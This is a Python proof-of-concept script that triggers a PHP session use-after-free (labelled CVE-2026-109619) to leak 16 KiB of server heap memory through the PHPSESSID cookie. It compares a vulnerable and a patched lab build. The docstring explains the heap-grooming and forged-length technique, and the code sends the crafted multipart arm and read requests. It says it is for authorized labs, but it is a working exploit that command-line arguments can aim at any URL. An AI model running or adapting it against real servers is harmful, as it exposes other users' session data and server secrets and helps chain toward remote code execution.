#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
leak_differential.py — the headline experiment of php2shell-detect.

Runs the stale-PS(id) leak oracle against the 8.5.x differential pair and
prints the vuln-vs-patched verdict.

Oracle mechanics (CVE-2026-109619, request-private state surviving its
backing memory):
  ARM   1001 spray fields + PHPSESSID=<NUL> + PHP_SESSION_UPLOAD_PROGRESS
        + a file part + a 12 MiB field. RFC1867 parsing runs before module
        RINIT; the upload-progress callback has half-initialized the session
        state (PS(id)) when the 12 MiB field trips the memory limit. The OOM
        bailout skips the MULTIPART_EVENT_END cleanup, so PS(id) dangles
        into the next request served by the same worker.
  READ  841 reclaim fields (43-byte values) + one forged 79-byte field
        (zend_string.len = 16384 written at offset +0x10, marker byte 'L'
        at +0x18) + 150 tail array fields. The next request's session init
        trusts the dangling pointer and the forged length, URL-encoding
        16 KiB of recycled heap memory into Set-Cookie: PHPSESSID=...
  VERDICT  cookie >= 16000 bytes starting with the marker  ==  LEAK.

The arm/read field layouts were first published by
unlimit0118/CVE-2026-109619-php2shell-poc (PHP 8.5.11); this script is an
independent, self-contained re-implementation used to A/B the vulnerable
and patched builds under identical configuration.

Expected output on this lab:
  vuln-8.5.11 : 4/4 leaks  (cookie_len=16384, prefix=b'LAAA...')
  patch-8.5.12: 0/4 leaks  (cookie_len=32, random hex)

Authorized-lab use only. All targets are loopback containers.
"""

import socket
import struct
import sys
from urllib.parse import unquote_to_bytes, urlsplit

PROG = "PHP_SESSION_UPLOAD_PROGRESS"
BOUND_ARM = b"S" * 17
BOUND_READ = b"B" * 10


def multipart(parts, boundary):
    body = bytearray()
    for p in parts:
        name, data = p[0], p[1]
        filename = p[2] if len(p) > 2 else None
        if isinstance(name, str):
            name = name.encode()
        if isinstance(filename, str):
            filename = filename.encode()
        body += (b"--" + boundary +
                 b'\r\nContent-Disposition: form-data; name="' + name + b'"')
        if filename is not None:
            body += b'; filename="' + filename + b'"\r\nContent-Type: application/octet-stream'
        body += b"\r\n\r\n" + data + b"\r\n"
    body += b"--" + boundary + b"--\r\n"
    return bytes(body)


def post(url, parts, boundary, timeout=60):
    body = multipart(parts, boundary)
    head = ("POST %s HTTP/1.1\r\nHost: %s\r\n"
            "Content-Type: multipart/form-data; boundary=%s\r\n"
            "Content-Length: %d\r\nConnection: close\r\n\r\n"
            % (url.path, url.hostname, boundary.decode(), len(body))).encode()
    out = bytearray()
    try:
        with socket.create_connection((url.hostname, url.port), timeout=timeout) as conn:
            conn.settimeout(timeout)
            try:
                conn.sendall(head + body)
            except OSError:
                pass  # the OOM can close the connection mid-upload
            try:
                while True:
                    d = conn.recv(65536)
                    if not d:
                        break
                    out += d
            except OSError:
                pass
    except OSError as e:
        return "<CONN %s>" % type(e).__name__, b""
    status = out.split(b"\r\n", 1)[0].decode("latin1", "replace") if out else "no-response"
    return status, bytes(out)


def cookie_value(resp):
    hdr = resp.partition(b"\r\n\r\n")[0]
    for line in hdr.split(b"\r\n"):
        if line.lower().startswith(b"set-cookie: phpsessid="):
            raw = line.split(b"=", 1)[1].split(b";", 1)[0]
            try:
                return unquote_to_bytes(raw.decode("latin1"))
            except Exception:
                return b""
    return b""


def arm_parts():
    parts = [("p%04d" % i, b"X") for i in range(1001)]
    parts += [("PHPSESSID", b"\0"),
              (PROG, b"lab"),
              ("f", b"A" * 64, "a.txt"),
              ("big", b"B" * (12 << 20))]
    return parts


def read_parts(marker=b"L", forged_len=16384):
    parts = [("PHPSESSID", b"attacksessionid0001"),
             (PROG, b"lab")]
    for i in range(841):
        parts.append((str(1000 + i), ("v%04d" % i + "x" * 43).encode()))
    forged = bytearray(b"A" * 79)
    struct.pack_into("<Q", forged, 0x10, forged_len)
    forged[0x18] = marker[0]
    parts.append(("1999", bytes(forged)))
    parts += [("tail%04d[0]" % i, b"x") for i in range(150)]
    return parts


def run(label, base_url, tries=4):
    url = urlsplit(base_url)
    print("=== %s  (%s)" % (label, base_url))
    hits = 0
    for i in range(tries):
        post(url, arm_parts(), BOUND_ARM)
        status, resp = post(url, read_parts(), BOUND_READ)
        ck = cookie_value(resp)
        leak = len(ck) >= 16000 and ck[:1] == b"L"
        if leak:
            hits += 1
        print("  try %d: status=%s cookie_len=%d prefix=%r %s"
              % (i, status.split(" ")[1] if " " in status else status,
                 len(ck), ck[:8], "<== HEAP LEAK" if leak else ""))
    verdict = ("VULNERABLE — stale PS(id) reused across requests"
               if hits else "CLEAN — no leak under this shape")
    print("  ==> %d/%d leaks -> %s\n" % (hits, tries, verdict))
    return hits


def main():
    targets = [
        ("vuln-8.5.11", "http://127.0.0.1:28132/leak"),
        ("patch-8.5.12", "http://127.0.0.1:28133/leak"),
    ]
    if len(sys.argv) > 1:
        targets = [(sys.argv[1], sys.argv[2])]
    results = {}
    for label, url in targets:
        results[label] = run(label, url)
    vuln = [k for k, v in results.items() if "vuln" in k]
    patch = [k for k, v in results.items() if "patch" in k]
    if vuln and patch and results[vuln[0]] > 0 and results[patch[0]] == 0:
        print("DIFFERENTIAL CONFIRMED: vulnerable build leaks, patched build clean.")
        return 0
    print("Differential not confirmed — see per-target output above.")
    return 1


if __name__ == "__main__":
    sys.exit(main())
